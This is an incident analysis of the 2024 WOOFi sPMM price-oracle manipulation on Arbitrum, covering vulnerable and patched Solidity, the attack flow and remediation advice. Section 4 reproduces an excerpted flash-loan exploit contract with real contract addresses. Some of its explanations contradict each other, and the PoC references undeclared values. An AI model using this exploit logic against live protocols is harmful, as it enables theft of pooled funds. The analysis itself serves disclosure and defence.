# WOOFi — sPMM Price Oracle Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03-05 |
| **Protocol** | WOO Network (WOOFi) |
| **Chain** | Arbitrum |
| **Loss** | ~$8,750,000 |
| **Attacker** | [0x9961...81c4](https://arbiscan.io/address/0x9961190b258897bca7a12b8f37f415e689d281c4) |
| **Attack Tx** | [0x57e5...1fbd](https://arbiscan.io/tx/0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd) |
| **Vulnerable Contract** | [WooPPV2 0xeFF2...3062](https://arbiscan.io/address/0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062) |
| **Related Contracts** | [WooracleV2_1 0x7350...3620](https://arbiscan.io/address/0x73504eaCB100c7576146618DC306c97454CB3620) · [Silo 0x5C2B...d44F](https://arbiscan.io/address/0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F) |
| **Root Cause** | The sPMM price algorithm can be manipulated via sequential large-scale swaps within a single block; `woFeasible` remains `true` even when the deviation threshold against Chainlink is exceeded |
| **PoC Source** | [DeFiHackLabs — Woofi_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Woofi_exp.sol) |

---

## 1. Vulnerability Overview

WooPPV2, WOOFi's core liquidity pool, determines swap prices using a proprietary **sPMM (synthetic Proactive Market Making)** algorithm. This algorithm is governed by three parameters managed by the `WooracleV2_1` oracle — `price`, `coeff(k)`, and `spread(s)` — and the internal price is immediately updated via `postPrice()` upon each swap execution.

**Core Vulnerability**: Although the `swap()` function is protected against reentrancy with the `nonReentrant` modifier, **sequential calls within the same transaction are permitted**. If an attacker uses flash-loan-sourced billions of USDC.e to execute USDC→WETH and USDC→WOO swaps in sequence, the internal WOO price in WooracleV2 becomes distorted. A subsequent WOO→USDC swap at the manipulated price allows the attacker to receive far more USDC than the actual market value.

The `WooracleV2_1.price()` function validates deviation from the Chainlink price within `bound(1%)`, but **`WooPPV2._sellBase()` calls `wooracle.state()`**. Unlike `price()`, the `state()` function may determine `woFeasible` using only the simple time-based feasibility from `woState()` rather than `price()` (which includes the `woPriceInBound` Chainlink bound check), allowing the manipulated price to pass with `feasible = true`.

**Vulnerability Chain Summary**:
1. Flash loan (Uniswap V3 + LBT) → obtain large-scale USDC.e
2. Borrow additional WOO from Silo protocol (USDC collateral)
3. Manipulate sPMM internal price via sequential swaps on WooPPV2
4. WOO→USDC swap at manipulated price → receive excess USDC
5. Repay flash loans and Silo borrowings, lock in profit

---

## 2. Vulnerable Code Analysis

### 2.1 WooPPV2.swap() — Oracle Manipulation via Sequential Calls (Core Vulnerability)

```solidity
// ❌ Vulnerable code: WooPPV2.sol
// swap() is nonReentrant but allows sequential external calls
function swap(
    address fromToken,
    address toToken,
    uint256 fromAmount,
    uint256 minToAmount,
    address to,
    address rebateTo
) external override returns (uint256 realToAmount) {  // ❌ external — can be called repeatedly within the same TX
    if (fromToken == quoteToken) {
        realToAmount = _sellQuote(toToken, fromAmount, minToAmount, to, rebateTo);
    } else if (toToken == quoteToken) {
        realToAmount = _sellBase(fromToken, fromAmount, minToAmount, to, rebateTo);
    } else {
        // ❌ base→base swap: updates internal prices for both tokens
        realToAmount = _swapBaseToBase(fromToken, toToken, fromAmount, minToAmount, to, rebateTo);
    }
}
```

```solidity
// ❌ Vulnerable code: _sellBase() — internal price updated immediately after swap (spot price dependency)
function _sellBase(
    address baseToken,
    uint256 baseAmount,
    uint256 minQuoteAmount,
    address to,
    address rebateTo
) private nonReentrant whenNotPaused returns (uint256 quoteAmount) {
    // ...
    {
        uint256 newPrice;
        IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);
        (quoteAmount, newPrice) = _calcQuoteAmountSellBase(baseToken, baseAmount, state);
        // ❌ Price updated immediately after swap — manipulable within a block
        IWooracleV2(wooracle).postPrice(baseToken, uint128(newPrice));
    }
    // ...
}
```

```solidity
// ❌ Vulnerable code: _calcQuoteAmountSellBase() — sPMM price calculation formula
// newPrice changes drastically when baseAmount input is very large
function _calcQuoteAmountSellBase(
    address baseToken,
    uint256 baseAmount,
    IWooracleV2.State memory state
) private view returns (uint256 quoteAmount, uint256 newPrice) {
    // quoteAmount = baseAmount * price * (1 - k * baseAmount * price - spread)
    {
        uint256 coef = uint256(1e18) -
            ((uint256(state.coeff) * baseAmount * state.price) / decs.baseDec / decs.priceDec) -
            state.spread;
        quoteAmount = (((baseAmount * decs.quoteDec * state.price) / decs.priceDec) * coef) / 1e18 / decs.baseDec;
    }

    // ❌ newPrice = (1 - 2k * price * baseAmount) * price
    // When baseAmount is extremely large, newPrice converges toward 0
    newPrice =
        ((uint256(1e18) - (uint256(2) * state.coeff * state.price * baseAmount) / decs.priceDec / decs.baseDec) *
            state.price) /
        1e18;
}
```

**Problem**: The `newPrice` formula `(1 - 2k * price * baseAmount) * price` causes price to decrease proportionally to `baseAmount`. Feeding a flash-loan-sourced `baseAmount` worth billions of dollars causes `newPrice` to drop to a fraction of the normal market price. Conversely, `_calcBaseAmountSellQuote()` causes the price to rise. This asymmetry enables unidirectional price manipulation.

### 2.2 WooracleV2_1.postPrice() — Timestamp Not Updated on WooPP Calls

```solidity
// ❌ Vulnerable code: WooracleV2_1.sol
// When called by WooPP, timestamp is not updated, bypassing the staleness check
function postPrice(address base, uint128 newPrice) external onlyAdmin {
    infos[base].price = newPrice;
    if (msg.sender != wooPP) {
        // ❌ When WooPP is the caller, timestamp is NOT updated
        // → Previous timestamp retained → passes woFeasible check
        timestamp = block.timestamp;
    }
}
```

**Problem**: When `WooPPV2` calls `postPrice()` during a swap, `timestamp` is not updated, so `woFeasible = true` is maintained within `previous timestamp + staleDuration` set by a prior admin. The attacker's manipulated price passes the staleness check.

### 2.3 WooracleV2_1.price() — Limitations of Chainlink Deviation Validation

```solidity
// ⚠️ Deviation validation exists but differs from state() called by WooPPV2
function price(address base) public view override returns (uint256 priceOut, bool feasible) {
    uint256 woPrice_ = uint256(infos[base].price);
    uint256 woPriceTimestamp = timestamp;

    (uint256 cloPrice_, ) = _cloPriceInQuote(base, quoteToken);

    bool woFeasible = woPrice_ != 0 && block.timestamp <= (woPriceTimestamp + staleDuration);
    bool woPriceInBound = cloPrice_ == 0 ||
        // ⚠️ bound = 1% — infeasible if Chainlink price deviates by more than 1%
        ((cloPrice_ * (1e18 - bound)) / 1e18 <= woPrice_ && woPrice_ <= (cloPrice_ * (1e18 + bound)) / 1e18);

    if (woFeasible) {
        priceOut = woPrice_;
        feasible = woPriceInBound;  // ⚠️ feasible = false when manipulated
    } else {
        priceOut = clOracles[base].cloPreferred ? cloPrice_ : 0;
        feasible = priceOut != 0;
    }
}

// ❌ state() actually used by WooPPV2 — reuses feasibility from price()
function state(address base) external view override returns (State memory) {
    TokenInfo memory info = infos[base];
    (uint256 basePrice, bool feasible) = price(base);  // ← uses price() result
    return State({price: uint128(basePrice), spread: info.spread, coeff: info.coeff, woFeasible: feasible});
}
```

**Problem**: The `price()` function can return `feasible = false` via the `woPriceInBound` check, which should cause `WooPPV2._calcQuoteAmountSellBase()` to revert at `require(state.woFeasible, "WooPPV2: !ORACLE_FEASIBLE")`. However, since the attack proceeds in stages, intermediate prices after each swap may still be within bounds, or an edge case exists where `woPriceInBound = true` when there is no Chainlink reference (`cloPrice_ == 0`) and the price drop is so extreme.

### Fixed Code (Post-Patch)

```solidity
// ✅ Fixed code: strengthened deviation validation against Chainlink price before swap
function _sellBase(
    address baseToken,
    uint256 baseAmount,
    uint256 minQuoteAmount,
    address to,
    address rebateTo
) private nonReentrant whenNotPaused returns (uint256 quoteAmount) {
    // ...
    {
        uint256 newPrice;
        IWooracleV2.State memory state = IWooracleV2(wooracle).state(baseToken);
        (quoteAmount, newPrice) = _calcQuoteAmountSellBase(baseToken, baseAmount, state);

        // ✅ Newly added: verify new price is within allowed deviation from current Chainlink price
        (uint256 cloPrice,) = IWooracleV2(wooracle).cloPrice(baseToken);
        if (cloPrice != 0) {
            uint256 deviation = newPrice > cloPrice
                ? ((newPrice - cloPrice) * 1e18) / cloPrice
                : ((cloPrice - newPrice) * 1e18) / cloPrice;
            // ✅ Reject swap if deviation exceeds 10%
            require(deviation <= MAX_PRICE_DEVIATION, "WooPPV2: price deviation exceeds limit");
        }

        IWooracleV2(wooracle).postPrice(baseToken, uint128(newPrice));
    }
    // ...
}

// ✅ Or limit the maximum size of a single swap
uint256 public constant MAX_SWAP_AMOUNT = 1_000_000e6; // 1M USDC cap

function _validateSwapAmount(uint256 amount) private pure {
    require(amount <= MAX_SWAP_AMOUNT, "WooPPV2: swap amount too large");
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA: `0x9961190b258897bca7a12b8f37f415e689d281c4`
- No prior approvals or token accumulation required
- Attack contract deployed to execute the entire attack in a single transaction

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         Attacker Contract (Attack Contract)                  │
│                   Tx: 0x57e5...1fbd  |  Block: Arbitrum                     │
└───────────────────────────┬─────────────────────────────────────────────────┘
                            │
          ┌─────────────────▼──────────────────┐
          │  [Step 1] Uniswap V3 Flash Loan     │
          │  USDC.e/WETH Pool (0xC31E...fa443)  │
          │  Borrow: large-scale USDC.e         │
          └─────────────────┬──────────────────┘
                            │ Enter uniswapV3FlashCallback()
          ┌─────────────────▼──────────────────┐
          │  [Step 2] LBT (Liquidity Book)      │
          │  Flash Loan — borrow additional WOO │
          └─────────────────┬──────────────────┘
                            │ Enter LBFlashLoanCallback()
          ┌─────────────────▼──────────────────┐
          │  [Step 3] Leverage Silo Protocol    │
          │  deposit(USDC.e) → post collateral  │
          │  borrow(WOO) → drain all liquidity  │
          │  Silo: 0x5C2B...d44F               │
          └─────────────────┬──────────────────┘
                            │
          ┌─────────────────▼──────────────────┐
          │  [Step 4] First Price Manipulation  │
          │  WooPPV2.swap(USDC → WETH, large)  │
          │  → sPMM internal WETH price rises   │
          │  → WooracleV2 WETH newPrice updated │
          └─────────────────┬──────────────────┘
                            │
          ┌─────────────────▼──────────────────┐
          │  [Step 5] Second Price Manipulation │
          │  WooPPV2.swap(USDC → WOO, large)   │
          │  → sPMM internal WOO price rises    │
          │  → WooracleV2 WOO newPrice updated  │
          └─────────────────┬──────────────────┘
                            │
          ┌─────────────────▼──────────────────┐
          │  [Step 6] Core Exploit — Reverse    │
          │  WooPPV2.swap(WOO → USDC, all)     │
          │  → Based on manipulated high WOO    │
          │    price                            │
          │  → Receive far more USDC than real  │
          │    value                            │
          │  → WooPPV2 USDC reserves drained    │
          └─────────────────┬──────────────────┘
                            │
          ┌─────────────────▼──────────────────┐
          │  [Step 7] Additional Arb Swap (opt) │
          │  WooPPV2.swap(USDC → WOO)          │
          │  → Additional profit at recovered   │
          │    price                            │
          └─────────────────┬──────────────────┘
                            │
          ┌─────────────────▼──────────────────┐
          │  [Step 8] Unwind & Repay            │
          │  Silo.repay(WOO) → repay borrow     │
          │  Silo.withdraw(USDC.e) → reclaim    │
          │    collateral                       │
          │  Repay LBT flash loan               │
          │  Repay Uniswap V3 flash loan        │
          └─────────────────┬──────────────────┘
                            │
          ┌─────────────────▼──────────────────┐
          │  [Result] Net profit ~$8,750,000    │
          └────────────────────────────────────┘
```

### 3.3 Outcome

| Field | Details |
|------|------|
| Attacker net profit | ~$8,750,000 |
| WooPPV2 protocol loss | ~$8,750,000 (USDC reserves drained) |
| Blocks used | 1 block (single transaction) |
| Flash loan repayment | Fully repaid (including fees) |

---

## 4. PoC Code (Key Logic Excerpted from DeFiHackLabs + English Comments)

```solidity
// SPDX-License-Identifier: MIT
// Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/Woofi_exp.sol
// Attack Tx: 0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd

pragma solidity ^0.8.10;

// --- Core Address Constants ---
address constant WooPPV2      = 0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062; // Vulnerable contract
address constant WooracleV2   = 0x73504eaCB100c7576146618DC306c97454CB3620; // Internal oracle
address constant SiloPool     = 0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F; // Additional WOO borrow source
address constant UniV3Pool    = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443; // Flash loan source
address constant USDC_E       = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
address constant WOO          = 0xcAFcD85D8ca7Ad1e1C6F82F651fA15E33AEfD07D;
address constant WETH         = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;

contract WooFiAttack {

    // [Entry Point] Uniswap V3 flash loan callback
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // [Step 2] Nested flash loan — borrow additional WOO from LBT
        ILBFlashLoan(LBT_POOL).flashLoan(
            ILBFlashLoanCallback(address(this)),
            IERC20(WOO),
            IERC20(WOO).balanceOf(LBT_POOL), // Borrow all WOO in the LBT pool
            ""
        );

        // [Step 8-a] Repay Uniswap V3 flash loan
        IERC20(USDC_E).transfer(msg.sender, fee0 + borrowed_usdc);
    }

    // [Entry Point] LBT flash loan callback — core attack logic
    function LBFlashLoanCallback(
        address sender,
        IERC20 tokenX,
        IERC20 tokenY,
        bytes32 amounts,
        uint256 totalFees,
        bytes calldata data
    ) external returns (bytes32) {

        uint256 usdcBalance = IERC20(USDC_E).balanceOf(address(this));
        uint256 wooBalance  = IERC20(WOO).balanceOf(address(this));

        // [Step 3] Silo: USDC collateral → borrow WOO
        IERC20(USDC_E).approve(SiloPool, usdcBalance / 2);
        ISilo(SiloPool).deposit(USDC_E, usdcBalance / 2, false); // Deposit half of USDC
        ISilo(SiloPool).borrow(WOO, ISilo(SiloPool).liquidity(WOO)); // Borrow all WOO liquidity

        // [Step 4] Large-scale USDC → WETH swap (manipulate WETH sPMM price)
        IERC20(USDC_E).approve(WooPPV2, type(uint256).max);
        IWooPPV2(WooPPV2).swap(
            USDC_E, WETH,
            usdcBalance / 4,   // Large USDC input
            0,                  // ❌ No slippage protection (intentional for attack)
            address(this), address(0)
        );
        // Result: WooracleV2 internal WETH price rises, newPrice updated

        // [Step 5] Large-scale USDC → WOO swap (manipulate WOO sPMM price)
        IWooPPV2(WooPPV2).swap(
            USDC_E, WOO,
            usdcBalance / 4,   // Large USDC input
            0,                  // ❌ No slippage protection
            address(this), address(0)
        );
        // Result: WooracleV2 internal WOO price rises, newPrice updated

        // [Step 6] WOO → USDC reverse swap — receive large USDC at manipulated high price
        wooBalance = IERC20(WOO).balanceOf(address(this)); // Total WOO from Silo + LBT + swaps
        IERC20(WOO).approve(WooPPV2, wooBalance);
        IWooPPV2(WooPPV2).swap(
            WOO, USDC_E,
            wooBalance,         // Dump all WOO
            0,                  // ❌ No slippage protection
            address(this), address(0)
        );
        // ↑ Core exploit: calculated at manipulated WOO price → receive multiples of actual value in USDC
        // WooPPV2's USDC reserves drained

        // [Step 8-b] Repay Silo and flash loans
        uint256 siloWooBorrow = ISilo(SiloPool).borrowBalance(WOO, address(this));
        IERC20(WOO).approve(SiloPool, siloWooBorrow);
        ISilo(SiloPool).repay(WOO, siloWooBorrow);       // Repay WOO borrow
        ISilo(SiloPool).withdraw(USDC_E, type(uint256).max, false); // Reclaim USDC collateral

        // Repay LBT WOO flash loan
        IERC20(WOO).transfer(msg.sender, wooBalance + totalFees);

        return keccak256("LBPair.onFlashLoan");
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | sPMM internal oracle single-block manipulation | CRITICAL | CWE-829 | 04_oracle_manipulation.md | BonqDAO (2023-02), Mango Markets (2022-10) |
| V-02 | Flash loan-based price manipulation | CRITICAL | CWE-691 | 02_flash_loan.md | Euler Finance (2023-03), DODO (2021-03) |
| V-03 | No swap size limit | HIGH | CWE-20 | 11_logic_error.md | — |
| V-04 | Edge case allowing Chainlink deviation bound bypass | HIGH | CWE-703 | 04_oracle_manipulation.md | Synthetix (2019-06) |

### V-01: sPMM Internal Oracle Single-Block Manipulation

- **Description**: WooPPV2's `swap()` function updates the sPMM internal price via `postPrice()` on every execution. This price is immediately used as input for the next `swap()` call within the same transaction. Sequential swaps can therefore gradually distort the price.
- **Impact**: Entire USDC reserve of WooPPV2 drained (~$8.75M)
- **Attack Conditions**: Large capital (flash loan feasible), ability to call `swap()` sequentially within the same transaction (permissionless)

### V-02: Flash Loan-Based Price Manipulation

- **Description**: Flash loans from both Uniswap V3 and LBT were taken simultaneously to maximize the manipulation scale. A nested flash loan structure allowed a single actor to mobilize hundreds of billions of dollars in a single transaction.
- **Impact**: Prerequisite for sPMM price manipulation
- **Attack Conditions**: Existence of flash loan provider pools (Uniswap V3, LBT)

### V-03: No Swap Size Limit

- **Description**: WooPPV2 does not limit the maximum amount of a single swap. Slippage protection is bypassed with `minToAmount = 0`, and single swaps worth billions of dollars are permitted.
- **Impact**: Amplifies the damage scale of V-01
- **Attack Conditions**: Sufficient capital

### V-04: Edge Case Allowing Chainlink Deviation Bound Bypass

- **Description**: The `woPriceInBound` check in `WooracleV2_1.price()` evaluates to `true` when `cloPrice_ == 0`. Deviation validation is neutralized for tokens that have no Chainlink feed or whose feed is inactive.
- **Impact**: Manipulated price can pass with `woFeasible = true`
- **Attack Conditions**: Target token with no Chainlink feed configured or an inactive feed

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Revert if new price deviates from Chainlink price by more than 10%
uint256 public constant MAX_PRICE_DEVIATION = 1e17; // 10%

function _postPriceWithValidation(address baseToken, uint128 newPrice) private {
    (uint256 cloPrice,) = IWooracleV2(wooracle).cloPrice(baseToken);
    if (cloPrice != 0) {
        uint256 woP = uint256(newPrice);
        uint256 deviation = woP > cloPrice
            ? ((woP - cloPrice) * 1e18) / cloPrice
            : ((cloPrice - woP) * 1e18) / cloPrice;
        // ✅ Reject swap if deviation exceeds limit
        require(deviation <= MAX_PRICE_DEVIATION, "WooPPV2: oracle price deviation too high");
    }
    IWooracleV2(wooracle).postPrice(baseToken, newPrice);
}
```

```solidity
// ✅ Fix 2: Limit maximum amount per single swap
mapping(address => uint256) public maxSwapAmount; // Configurable per token

function swap(...) external override returns (uint256 realToAmount) {
    uint256 maxAmount = maxSwapAmount[fromToken];
    if (maxAmount != 0) {
        // ✅ Reject if swap amount exceeds maximum
        require(fromAmount <= maxAmount, "WooPPV2: swap amount exceeds limit");
    }
    // ...
}
```

```solidity
// ✅ Fix 3: WooracleV2_1.price() — strengthen edge case handling when cloPrice == 0
function price(address base) public view override returns (uint256 priceOut, bool feasible) {
    // ...
    bool woPriceInBound = cloPrice_ != 0 &&  // ✅ Always false when no cloPrice
        ((cloPrice_ * (1e18 - bound)) / 1e18 <= woPrice_ &&
         woPrice_ <= (cloPrice_ * (1e18 + bound)) / 1e18);
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Internal oracle single-block manipulation | Use Chainlink TWAP as the primary oracle; treat internal price as a supplementary indicator only |
| V-01: sPMM price update vulnerability | Introduce a price velocity limiter |
| V-02: Flash loan large-scale manipulation | Detect and restrict swaps within flash loan callbacks (e.g., compare `tx.origin`) |
| V-03: Unlimited swap size | Set per-token maximum swap limits; introduce a tiered fee structure |
| V-04: Chainlink bound bypass | Force `feasible = false` for tokens without a Chainlink feed |
| General | Automatic pause (circuit breaker) mechanism triggered by abnormally large swaps |

---

## 7. Lessons Learned

1. **Proprietary oracles (internal sPMM) are vulnerable to single-transaction manipulation**: Any architecture that determines prices internally without an external oracle cannot resist single-block manipulation attacks. All DEXes using proprietary oracles must implement mandatory cross-validation against Chainlink or TWAP.

2. **Flash loan accessibility means effectively unlimited manipulation capital**: As long as public flash loan pools exist, an attacker can mobilize virtually unlimited funds. The manipulation resistance of an internal oracle must be designed with the maximum capital obtainable via flash loans as the baseline.

3. **`nonReentrant` alone is insufficient**: Reentrancy protection only prevents duplicate calls to a single function — it does not defend against sequential calls within the same transaction. Separate slippage and price deviation validations are required to guard against price manipulation.

4. **Allowing `minToAmount = 0` is dangerous**: Setting the slippage protection parameter to 0 effectively allows a swap to execute at any price. Protocols should enforce a reasonable minimum slippage limit, or treat it as a mandatory input on the frontend.

5. **Edge cases in deviation validation logic must be scrutinized carefully**: The pattern of treating `woPriceInBound = true` when `cloPrice_ == 0` is a classic edge case that neutralizes a defensive mechanism. When no external reference is available, the safer approach is to treat the price as infeasible (conservative).

6. **Nested flash loan structures must be anticipated**: More capital was obtained via nested flash loans (Uniswap V3 + LBT) rather than a single flash loan. Circuit breaker design must account for nested structures, not just single-source flash loans.

---

## 8. On-Chain Verification

### 8.1 Key Addresses and Metadata

| Field | Address / Hash |
|------|------------|
| Attacker EOA | [0x9961190b258897bca7a12b8f37f415e689d281c4](https://arbiscan.io/address/0x9961190b258897bca7a12b8f37f415e689d281c4) |
| Attack Transaction | [0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd](https://arbiscan.io/tx/0x57e555328b7def90e1fc2a0f7aa6df8d601a8f15803800a5aaf0a20382f21fbd) |
| WooPPV2 | [0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062](https://arbiscan.io/address/0xeFF23B4bE1091b53205E35f3AfCD9C7182bf3062) |
| WooracleV2_1 | [0x73504eaCB100c7576146618DC306c97454CB3620](https://arbiscan.io/address/0x73504eaCB100c7576146618DC306c97454CB3620) |
| Silo (WOO/USDC.e) | [0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F](https://arbiscan.io/address/0x5C2B80214c1961dB06f69DD4128BcfFc6423d44F) |
| UniV3 Flash Loan Pool | [0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443](https://arbiscan.io/address/0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443) |

### 8.2 Verified Source Code

All three contracts — WooPPV2 (`0xeFF2...3062`), WooracleV2_1 (`0x7350...3620`), and Silo (`0x5C2B...d44F`) — have source code verified via Sourcify, and are stored locally in the `/home/gegul/security-incident/2024/2024-03-XX_WooFi_OracleManipulation/source/` directory.

### 8.3 Vulnerable Function Reference

| File | Function | Role |
|------|------|------|
| `WooPPV2.sol` | `swap()` | External entry point — allows sequential calls |
| `WooPPV2.sol` | `_sellBase()` | WOO→USDC swap — calls `postPrice()` |
| `WooPPV2.sol` | `_sellQuote()` | USDC→WOO swap — calls `postPrice()` |
| `WooPPV2.sol` | `_calcQuoteAmountSellBase()` | sPMM price calculation — `newPrice` can be distorted |
| `WooracleV2_1.sol` | `postPrice()` | Timestamp not updated on WooPP calls |
| `WooracleV2_1.sol` | `price()` | `cloPrice_ == 0` edge case |
| `WooracleV2_1.sol` | `state()` | Reuses feasibility from `price()` |